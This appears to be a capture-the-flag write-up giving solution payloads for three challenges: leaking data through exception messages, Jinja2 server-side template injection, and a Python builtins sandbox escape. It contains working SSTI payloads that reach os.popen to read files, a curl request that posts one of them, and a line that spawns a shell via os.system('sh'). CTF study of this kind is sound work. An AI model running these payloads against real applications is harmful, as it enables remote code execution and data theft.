## Noname challenge

```py
# we can still get output via exceptions.
# we can intentionally fails and leaks useful data in the exception message.
raise Exception('hi 42')
int('hi 42')
```

## Portal challenge

```py
# the username (name) is directly interpolated into the template with %s, allowing Jinja2 code injection.
# There are multiple payloads to achieve Remote Code Execution (RCE) or file read via the SSTI vulnerability to read flag.txt
{{ get_flashed_messages.__globals__.__builtins__.open('flag.txt').read() }}

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}

{{ config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read() }}
```

```sh
curl -X POST http://localhost:4000/register \
  -d "user={{ get_flashed_messages.__globals__.__builtins__.open('flag.txt').read() }}&pwd=123"
```

## Small challenge

```py
# since print function is a built-in function, we get builtins module via __self__ attribute
# from builtins, we can import any module using __import__
print.__self__.__import__('os')
print.__self__.__import__('math')

# importing os allows us to execute commands, e.g., ls, sh etc
# though it needs more than 42 character
print.__self__.__import__('os').system('sh')
```
